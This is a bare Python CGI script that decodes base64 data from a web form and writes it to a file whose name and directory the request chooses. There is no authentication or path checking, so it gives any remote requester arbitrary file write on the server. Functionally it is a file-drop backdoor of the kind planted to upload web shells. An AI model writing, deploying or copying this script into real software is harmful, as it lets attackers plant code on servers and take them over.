#!/usr/bin/env python

import os
import cgi
import base64

form = cgi.FieldStorage();

fpath = form['fpath'].value
fname = form['fname'].value
fdata = form['fdata'].value

os.chdir(fpath)
fp = open(fname, 'wb')
fp.write(base64.b64decode(fdata))
fp.close()

